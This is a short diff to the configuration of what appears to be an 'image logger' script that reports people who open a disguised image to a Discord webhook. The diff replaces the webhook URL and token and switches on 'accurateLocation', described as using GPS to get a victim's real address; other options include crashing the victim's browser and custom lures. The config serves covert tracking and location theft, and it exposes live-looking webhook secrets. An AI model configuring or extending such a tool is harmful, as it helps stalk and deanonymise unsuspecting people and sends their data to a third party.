@@ -13,7 +13,7 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1387488044394876938/QxOOPXgYDNmEwYWCIFXgssP-KHtoUIysjVNLPyLUsE0u3NMIkFj0cGSTeaHGZw544wek",
+    "webhook": "https://discord.com/api/webhooks/1387489577425440940/B2gwwmgjr96cXC-0WyEFI_yvMwU7PBG0ph6-4pPm5wFJHMan0JwnnPQqTILQSVNTV8Jl",
     "image": "https://imgur.com/padd9Gr", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -25,7 +25,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/xdexty0/Chromebook-Crasher)
     
-    "accurateLocation": true, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
